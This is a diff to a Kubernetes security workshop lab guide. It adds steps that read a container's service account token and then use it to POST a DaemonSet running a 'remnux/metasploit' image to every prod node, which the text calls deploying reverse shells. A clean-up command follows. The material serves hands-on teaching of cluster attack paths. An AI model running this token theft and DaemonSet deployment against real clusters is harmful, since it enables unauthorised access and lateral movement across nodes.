@@ -101,6 +101,13 @@ shell
 
 #### you can get at this info from inside the container via the file system @ ```/run/secrets/kubernetes.io/serviceaccount/token``` and you can get the api-server info via the two environment variables ___$KUBERNETES_SERVICE_HOST___ ___$KUBERNETES_SERVICE_PORT___
 
+### If you skipped the remote exploit, just run this command within your terminal:
+```bash
+kubectl exec -it $(kubectl get pods -l app=dvwa -o=jsonpath='{.items[0].metadata.name}') /bin/bash
+```  
+
+## Now from within the shell ...
+
 ```bash
 ### is curl here ?
 
@@ -108,7 +115,7 @@ curl -k https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods/
 
 ### nope! but apt is ;-)
 
-apt-get update && apt-get install curl
+apt-get update && apt-get install curl jq
 
 ### now that we have curl we can grab the service account that was automaticly mounted into the container ...
 export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
@@ -118,10 +125,11 @@ export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
 curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods/
 
 
-
+curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"kind":"DaemonSet","apiVersion":"apps/v1","metadata":{"name":"remnux","creatonTimestamp":null,"annotations":{"deprecated.daemonset.template.generation":"0"}},"spec":{"selector":{"matchLabels":{"name":"remnux"}},"template":{"metadata":{"creationTimestamp":null,"labels":{"name":"remnux"}},"spec":{"containers":[{"name":"remnux","image":"remnux/metasploit","resources":{"limits":{"memory":"200Mi"},"requests":{"cpu":"100m","memory":"200Mi"}},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeSelector":{"type":"prod"},"securityContext":{},"schedulerName":"default-scheduler"}},"updateStrategy":{"type":"RollingUpdate","rollingUpdate":{"maxUnavailable":1}},"revisionHistoryLimit":10},"status":{"currentNumberScheduled":0,"numberMisscheduled":0,"desiredNumberScheduled":0,"numberReady":0}}' https://$KUBERNETES_SERVICE_HOST/apis/apps/v1/namespaces/default/daemonsets
 
 ```
 
+- Wow look at that, because we had write access, we just deployed a "DaemonSet" of a container with reverse shells. (DaemonSets get deployed out to all nodes in a cluster [of a specific label] )
 
 
 
@@ -130,5 +138,9 @@ curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/api/v
 
 
 ## Clean up:
+- Remove the "DaemonSet"
+``` kubectl delete ds remnux ```
+
+
 
  [Return to schedule](../../Docs/SCHEDULE.md)
